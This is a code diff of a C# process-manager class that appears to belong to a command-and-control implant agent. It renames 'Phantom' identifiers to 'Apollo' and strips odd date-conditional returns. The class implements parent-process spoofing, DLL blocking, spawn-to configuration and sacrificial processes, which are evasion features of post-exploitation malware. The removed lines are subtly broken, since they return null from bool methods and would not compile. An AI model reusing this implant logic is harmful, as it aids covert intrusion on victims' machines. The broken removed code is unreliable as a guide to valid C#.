@@ -1,9 +1,9 @@
-﻿using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.PhantomStructs;
+﻿using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.ApolloStructs;
 
 namespace Process
 {
-    public class ProcHandler : IProcessManager
+    public class ProcessManager : IProcessManager
     {
         private bool _blockDlls = false;
         private int _ppid = System.Diagnostics.Process.GetCurrentProcess().Id;
@@ -14,7 +14,7 @@ namespace Process
 
         private IAgent _agent;
 
-        public ProcHandler(IAgent agent)
+        public ProcessManager(IAgent agent)
         {
             _agent = agent;
         }
@@ -22,7 +22,7 @@ namespace Process
         public bool BlockDLLs(bool status)
         {
             _blockDlls = status;
-            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+            return true;
         }
 
         public ApplicationStartupInfo GetStartupInfo(bool x64 = true)
@@ -32,16 +32,16 @@ namespace Process
             results.Arguments = x64 ? _argumentsx64 : _argumentsx86;
             results.ParentProcessId = _ppid;
             results.BlockDLLs = _blockDlls;
-            if(DateTime.Now.Year > 2020) { return results; } else { return null; }
+            return results;
         }
 
-        public PhantomInterop.Classes.Core.Process NewProcess(string lpApplication, string lpArguments, bool startSuspended = false)
+        public ApolloInterop.Classes.Core.Process NewProcess(string lpApplication, string lpArguments, bool startSuspended = false)
         {
-            if(DateTime.Now.Year > 2020) { return new SacrificialProcess(
+            return new SacrificialProcess(
                 _agent,
                 lpApplication,
                 lpArguments,
-                startSuspended); } else { return null; }
+                startSuspended);
         }
 
         public bool SetPPID(int pid)
@@ -60,7 +60,7 @@ namespace Process
                 }
             }
             catch { }
-            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
+            return bRet;
         }
 
         public bool SetSpawnTo(string lpApplication, string lpCommandLine = null, bool x64 = true)
@@ -75,7 +75,7 @@ namespace Process
                 _applicationx86 = lpApplication;
                 _argumentsx86 = lpCommandLine;
             }
-            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+            return true;
         }
     }
 }
